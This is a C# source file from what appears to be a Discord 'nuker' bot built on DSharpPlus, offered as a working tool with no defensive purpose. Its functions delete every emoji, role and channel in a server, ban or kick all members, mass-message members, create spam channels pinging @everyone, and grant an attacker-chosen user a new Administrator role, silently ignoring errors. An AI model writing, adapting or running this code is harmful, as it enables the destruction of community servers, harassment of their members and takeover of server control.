using DSharpPlus;
using DSharpPlus.Entities;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace Discord_Bro.Nuke
{
    class Nuking
    {
        public delegate Task FuncToInvoke(DiscordGuild guild);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <param name="func"></param>
        private static async void Nuke(DiscordGuild guild, FuncToInvoke func)
        {
            await func(guild);

            if (Program.keepRunning)
                End();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guildId"></param>
        /// <param name="func"></param>
        public static void NukeServer(string guildId, FuncToInvoke func)
        {
            DiscordGuild guild = Client.GetGuildById(guildId);

            if (guild != default)
            {
                Nuke(guild, func);
            }
            else
            {
                MessageHandler.ShowMessage(" [*] Couldn't find guild!", ConsoleColor.Red);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private static void End()
        {
            MessageHandler.ShowMessage("\n [*] Done with the nuking!", ConsoleColor.Magenta);
            MessageHandler.ShowMessage("[*] Press Enter to go back!", ConsoleColor.Green);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task DeleteEmojis(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.ManageEmojis))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            IReadOnlyList<DiscordGuildEmoji> emojis = await guild.GetEmojisAsync();

            Console.WriteLine(" [*] Deleting emojis...");
            foreach (DiscordGuildEmoji emoji in emojis)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }
                    await guild.DeleteEmojiAsync(emoji);
                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task DeleteRoles(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.ManageRoles))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            IReadOnlyDictionary<ulong, DiscordRole> roles = guild.Roles;

            Console.WriteLine(" [*] Deleting roles...");
            foreach (KeyValuePair<ulong, DiscordRole> keyValue in roles)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    await keyValue.Value.DeleteAsync();
                }
                catch (Exception) { }
            }
        }

        private static bool CheckPermission(DiscordGuild guild, Permissions permission)
        {
            return guild.GetMemberAsync(Client.GetBotId()).GetAwaiter().GetResult().Permissions.HasPermission(permission);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task DeleteAllChannels(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.ManageChannels))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            IReadOnlyList<DiscordChannel> channels = await guild.GetChannelsAsync();

            Console.WriteLine(" [*] Deleting channels...");
            foreach (DiscordChannel d in channels)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    await d.DeleteAsync();
                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task BanAllMembers(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.BanMembers))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();

            ulong bot = Client.DiscordClient.CurrentUser.Id;

            Console.WriteLine(" [*] Banning members...");
            foreach (DiscordMember member in members)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    if (member.Id != bot)
                    {
                        await member.BanAsync();
                    }
                }
                catch (Exception) { }
            }
        }

        public static async Task KickAllMembers(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.KickMembers))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();

            ulong bot = Client.DiscordClient.CurrentUser.Id;

            Console.WriteLine(" [*] kicking members...");
            foreach (DiscordMember member in members)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    if (member.Id != bot)
                    {
                        await member.RemoveAsync();
                    }
                }
                catch (Exception) { }
            }
        }

        public static async Task SendMessageToUsers(DiscordGuild guild)
        {
            IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();
            ulong bot = Client.DiscordClient.CurrentUser.Id;

            Console.WriteLine(" [*] Sending message to members...");
            foreach (DiscordMember member in members)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    if (member.Id != bot)
                    {
                        await member.SendMessageAsync(Program.configuration.DmMessage);
                    }
                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task CreateSpamChannels(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.ManageChannels))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            Console.WriteLine(" [*] Creating channels...");
            for (int i = 0; i < 2; i++)
            {
                try
                {
                    if (!Program.keepRunning)
                    {
                        break;
                    }

                    DiscordChannel channel = await guild.CreateChannelAsync($"eheh-{i}", ChannelType.Text);
                    await channel.SendMessageAsync($"@everyone yellooooooow");
                }
                catch (Exception) { }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="guild"></param>
        /// <returns></returns>
        public static async Task CreateAdminRole(DiscordGuild guild)
        {
            if (!CheckPermission(guild, Permissions.ManageRoles))
            {
                MessageHandler.ShowMessage(" [*] Bot has no permissions!", ConsoleColor.Red);
                return;
            }

            try
            {
                Console.Write(" [*] User id -> ");
                string userId = Console.ReadLine();

                ulong uintId = Convert.ToUInt64(userId);

                Console.WriteLine(" [*] Creating admin role...");
                DiscordRole adminRole = await guild.CreateRoleAsync("nukeAdminRole", Permissions.Administrator);

                DiscordMember member = await guild.GetMemberAsync(uintId);
                Console.WriteLine($" [*] Giving admin role to user {member.DisplayName}...");
                await member.GrantRoleAsync(adminRole);

            }
            catch (Exception ex)
            {
                MessageHandler.ShowMessage($" [*] Error -> {ex.Message}", ConsoleColor.Red);
            }
        }
    }
}
